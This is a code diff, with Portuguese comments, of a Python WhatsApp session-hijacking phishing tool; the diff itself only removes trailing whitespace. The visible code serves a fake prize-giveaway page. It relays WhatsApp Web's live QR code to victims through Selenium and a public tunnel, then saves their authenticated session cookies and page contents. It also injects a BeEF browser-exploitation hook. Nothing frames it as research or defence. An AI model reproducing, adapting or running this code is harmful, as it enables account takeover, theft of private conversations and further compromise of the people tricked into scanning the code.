@@ -23,7 +23,7 @@ import webbrowser
 
 # Configurações
 PHISHING_PORT = random.randint(8000, 9000)
-BEEF_HOOK = "" 
+BEEF_HOOK = ""
 
 # HTML com a estrutura visual do WhatsApp solicitada
 PHISHING_HTML = """
@@ -52,7 +52,7 @@ PHISHING_HTML = """
         <h1>🎉 PARABÉNS! VOCÊ FOI SORTEADO! 🎉</h1>
         <div class="prize">🏆 PRÊMIO: iPhone 15 Pro Max + R$ 5.000 🏆</div>
         <p>Para validar e resgatar seu prêmio, <strong>faça login no WhatsApp Web</strong> escaneando o QR Code abaixo:</p>
-        
+
         <div class="qr-container">
             <div data-testid="link-device-qr-code" style="text-align: center;">
                 <div style="margin-bottom: 10px;">
@@ -137,7 +137,7 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
         else:
             self.send_response(404)
             self.end_headers()
-    
+
     def log_message(self, format, *args):
         pass
 
@@ -190,7 +190,7 @@ def start_whatsapp_hijacking():
         # options.add_argument("--headless")
         browser = webdriver.Firefox(options=options)
         browser.get("https://web.whatsapp.com/")
-        
+
         print("⏳ Aguardando QR Code do WhatsApp...")
         canvas = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))
 
@@ -204,7 +204,7 @@ def start_whatsapp_hijacking():
         save_qr()
         print("🎯 QR Code gerado e sincronizado com o localhost!")
         print("🎯 Aguardando escanear...")
-        
+
         while True:
             try:
                 # Se o canvas sumir, significa que a sessão foi autenticada
@@ -212,10 +212,10 @@ def start_whatsapp_hijacking():
                 save_qr()
             except TimeoutException:
                 print("\n🎉 LOGIN DETECTADO! Extraindo dados da sessão...")
-                
+
                 # Gerar ID da sessão
                 session_id = int(time.time())
-                
+
                 # 1. Salvar Cookies (Formatado para Cookie-Editor)
                 cookies = browser.get_cookies()
                 formatted_cookies = []
@@ -237,11 +237,11 @@ def start_whatsapp_hijacking():
 
                 with open(f"cookies_sessao_{session_id}.json", "w", encoding="utf-8") as f:
                     json.dump(formatted_cookies, f, indent=4)
-                
+
                 # 2. Salvar HTML da página logada
                 with open(f"index_sessao_{session_id}.html", "w", encoding="utf-8") as f:
                     f.write(browser.page_source)
-                
+
                 print(f"✅ Sessão salva: cookies_sessao_{session_id}.json e index_sessao_{session_id}.html")
                 break
             time.sleep(3)
@@ -255,12 +255,12 @@ def main():
     global BEEF_HOOK
     print("🚀 SISTEMA DE CAPTURA WHATSAPP + BEEF")
     BEEF_HOOK = input("\n💉 Insira o script hook do BeEF: ")
-    
+
     # Inicia servidor phishing em background
     server_thread = threading.Thread(target=start_phishing_server, daemon=True)
     server_thread.start()
     time.sleep(1)
-    
+
     # Exibe URL Local e abre automaticamente no navegador padrão
     local_url = f"http://localhost:{PHISHING_PORT}"
     print(f"🏠 URL Local: {local_url}")
@@ -275,15 +275,15 @@ def main():
 
     tunnel_thread = threading.Thread(target=setup_simple_tunnel, args=(handle_tunnel,), daemon=True)
     tunnel_thread.start()
-    
+
     # Inicia imediatamente a captura de sessão abrindo o WhatsApp via Selenium
     browser = start_whatsapp_hijacking()
-    
+
     print("\n" + "="*60)
     print("✅ PROCESSO CONCLUÍDO!")
     print("Sessões capturadas estão na pasta atual.")
     print("="*60)
-    
+
     try:
         while True: time.sleep(10)
     except KeyboardInterrupt:
